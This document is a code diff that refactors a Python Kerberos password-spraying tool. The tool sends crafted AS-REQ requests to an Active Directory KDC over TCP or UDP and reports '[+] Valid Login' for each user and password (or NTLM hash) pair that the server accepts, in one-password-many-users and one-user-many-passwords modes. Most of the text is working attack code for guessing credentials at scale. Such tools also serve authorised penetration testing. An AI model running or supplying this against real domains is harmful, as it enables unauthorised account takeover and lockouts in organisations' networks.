@@ -22,6 +22,9 @@ RC4_HMAC = 23
 NT_PRINCIPAL = 1
 NT_SRV_INST =2
 
+# ==========================
+#  Utils
+# ==========================
 def random_bytes(n):
     return ''.join(chr(c) for c in sample(xrange(256), n))
 
@@ -52,15 +55,20 @@ def detect_address_family(ip):
         print("[!] Invalid IP address format:", repr(ip))
         sys.exit(1)
 
-def ntlm_hash(pwd):
-    return MD4.new(pwd.encode('utf-16le'))
+def pwd_key_clear(pwd):
+    return (RC4_HMAC, MD4.new(pwd.encode('utf-16le')).digest())
 
+def pwd_key_hash(pwd):
+    return (RC4_HMAC, pwd.decode('hex'))
+
+# ==========================
+#  Classes
+# ==========================
 def _c(n, t):
     return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))
 
 def _v(n, t):
     return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)
-
 
 def application(n):
     return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)
@@ -138,14 +146,16 @@ class PaEncTsEnc(Sequence):
         NamedType('patimestamp', _c(0, KerberosTime())),
         NamedType('pausec', _c(1, Microseconds())))
 
-
 class AsReq(KdcReq):
     tagSet = application(10)
 
+# ==========================
+#  Kerberos Request
+# ==========================
 def build_req_body(realm, service, host, nonce, cname=None):
     req_body = KdcReqBody()
     # (Forwardable, Proxiable, Renewable, Canonicalize)
-#   req_body['kdc-options'] = "'01010000100000000000000000000000'B"
+    # req_body['kdc-options'] = "'01010000100000000000000000000000'B"
     req_body['kdc-options'] = "'00000000000000000000000000010000'B"
     if cname is not None:
         req_body['cname'] = None
@@ -177,7 +187,6 @@ def build_pa_enc_timestamp(current_time, key):
     pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))
 
     return pa_ts
-
 
 def build_as_req(target_realm, user_name, key, current_time, nonce):
     req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
@@ -245,6 +254,13 @@ def _decrypt_rep(data, key, spec, enc_spec, msg_type):
     rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
     return rep, rep_enc
     
+def check(data, user, pwd):
+    i=0
+    for c in data:       
+        i=i+1
+        if(i==18):
+            if(ord(c)==0x0b):
+                print('[+] Valid Login: %s:%s'%(user, pwd))
 
 def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
     nonce = getrandbits(31)
@@ -252,12 +268,7 @@ def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
     as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
     sock = send_req_tcp(as_req, kdc_a)
     data = recv_rep_tcp(sock)
-    i=0
-    for c in data:       
-        i=i+1
-        if(i==18):
-            if(ord(c)==0x0b):
-                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
+    check(data, user_name, orgin_key)
 
 def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
     nonce = getrandbits(31)
@@ -265,12 +276,7 @@ def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
     as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
     sock = send_req_udp(as_req, kdc_a)
     data = recv_rep_udp(sock)
-    i=0
-    for c in data:       
-        i=i+1
-        if(i==18):
-            if(ord(c)==0x0b):
-                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
+    check(data, user_name, orgin_key)
 
 if __name__ == '__main__':
     if len(sys.argv)!=6:
@@ -289,7 +295,6 @@ if __name__ == '__main__':
         print("  passwordtype: clearpassword | ntlmhash | pwdfile-clear | pwdfile-ntlm")
         print("  data: username | password")
         sys.exit(1)
-
 
     kdc_ip = sys.argv[1]
     user_realm = sys.argv[2].upper()
@@ -320,18 +325,16 @@ if __name__ == '__main__':
     # ------------------------------
     # MODE A - ONE PASSWORD -> MANY USERS
     # ------------------------------
-
     if passwordtype in ['clearpassword', 'ntlmhash']:
         print('[*] Running mode: one password -> list of users')
 
         if passwordtype == 'clearpassword':
             print('[*] ClearPassword:       %s'%(data_value))
-            user_key = (RC4_HMAC, ntlm_hash(data_value).digest())
+            user_key = pwd_key_clear(data_value)
         else:
             print('[*] NTLMHash:            %s'%(data_value))
-            user_key = (RC4_HMAC, data_value.decode('hex'))
+            user_key = pwd_key_hash(data_value)
         
-        # TCP / UDP handling preserved
         print('[*] Using %s to test a single password against a list of Active Directory accounts.'%(protocol))
         for user in file_object:
             username = user.strip()
@@ -347,11 +350,6 @@ if __name__ == '__main__':
         fixed_user = data_value
         print('[*] Single User:          %s'%(fixed_user))
 
-        def pwd_key_clear(pwd):
-            return (RC4_HMAC, ntlm_hash(pwd).digest())
-        def pwd_key_hash(pwd):
-            return (RC4_HMAC, pwd.decode('hex'))
-
         if passwordtype == 'pwdfile-clear':
             print('[*] Running mode ~ User: %s -> list of passwords clear'%(fixed_user))
             pwd_key = pwd_key_clear
@@ -359,7 +357,6 @@ if __name__ == '__main__':
             print('[*] Running mode ~ User: %s -> list of passwords ntlm'%(fixed_user))
             pwd_key = pwd_key_hash
 
-            
         print('[*] Using %s to test a list of passwords against a single Active Directory account.'%(protocol))
         for password in file_object:
             pwd = password.strip()
@@ -374,6 +371,3 @@ if __name__ == '__main__':
         sys.exit(0)
     
     print("All Done")
-        
-
-
